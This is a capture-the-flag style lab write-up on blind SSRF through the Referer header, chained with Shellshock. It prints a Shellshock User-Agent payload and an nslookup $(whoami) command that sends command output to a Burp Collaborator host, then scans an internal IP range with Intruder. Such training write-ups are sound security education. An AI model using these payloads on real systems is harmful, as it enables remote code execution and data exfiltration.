**SSRF || Lab#6 : Blind SSRF with Shellshock exploitation**

<img width="870" height="617" alt="image" src="https://github.com/user-attachments/assets/1d16b98b-607c-4341-a7a4-d34468a669bd" />

Vulnerable parameter → Referer header

Goal of the lab is to use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080.

Lets open the Lab

<img width="856" height="565" alt="image" src="https://github.com/user-attachments/assets/675ee206-6a2d-4218-8d15-56dc02986fb6" />

Lets intercept this traffic in Burp suite

<img width="1100" height="312" alt="image" src="https://github.com/user-attachments/assets/adcf86b1-b552-437b-a1bf-62f84871bd45" />

Lets move this traffic to Repeater.

<img width="1100" height="492" alt="image" src="https://github.com/user-attachments/assets/2ea48dfb-e6cf-458c-9fce-ca58a5ca8349" />

Now, we will use a blind based SSRF vulnerability to perform Shell Shock exploit in the user agent.

Shell shock vulnerability allows to perform remote code execution on the server.

We will add Shell Shock payload in the user agent

() { :; }; /bin/eject

Before that, lets start the Burp Collaborator.

As I am using Burp Suite community edition, I will be putting screen shots.

<img width="882" height="476" alt="image" src="https://github.com/user-attachments/assets/03c21b2e-23cb-49b0-97f3-022f60c23d67" />

<img width="907" height="320" alt="image" src="https://github.com/user-attachments/assets/055d2bdb-4cfd-42a6-97da-2b8072a99f9e" />

<img width="526" height="22" alt="image" src="https://github.com/user-attachments/assets/ad4bf313-4e85-48a4-980d-0ff3999da00d" />

This is the collaborator domain which we will use.

<img width="1062" height="360" alt="image" src="https://github.com/user-attachments/assets/4df9dad1-d77e-493c-ae78-323bfd612714" />

Here we are using /usr/bin/nslookup $(whoami) which will bring the user details.

Now, in the Referer we need to put the IP address of the internal server which is provided in the lab description (192.168.0.X:8080)

<img width="1100" height="622" alt="image" src="https://github.com/user-attachments/assets/5ebbcacd-00b7-49a2-83da-19d61cda8ca2" />

Lets forward this traffic.

If the server 192.160.0.1 is there, and is vulnerable to shell shock, the user agent will be used for this request which will run whoami and ping to Burp Collaborator domain.

Lets go to the Burp Collaborator client

<img width="951" height="381" alt="image" src="https://github.com/user-attachments/assets/d2fde8ee-8086-4304-90d3-ec36ef1eaa74" />

We dont see anything. It means server is not running on 192.168.0.1:8080

Now we need to scan all 255 ports to find the server.

Lets move this traffic to Intruder.

<img width="1100" height="387" alt="image" src="https://github.com/user-attachments/assets/ce34c2ce-cae0-4fae-8c32-040e1e59c7df" />

We have selected our position. Lets add the payload.

<img width="862" height="492" alt="image" src="https://github.com/user-attachments/assets/4b1962ed-6b5f-4aaa-95ff-d66d89f67de8" />

Lets start the attack.

<img width="1100" height="346" alt="image" src="https://github.com/user-attachments/assets/3997e7cd-0410-4bfb-be49-2d2dc5a3ebba" />

And we got the user details. Lets submit it to solve the Lab

<img width="615" height="475" alt="image" src="https://github.com/user-attachments/assets/304b0a85-b1dc-485a-838b-4bd9b18614a7" />

And lab is solved

<img width="690" height="287" alt="image" src="https://github.com/user-attachments/assets/27881a46-28ab-4d9d-932d-4fac18a4d187" />

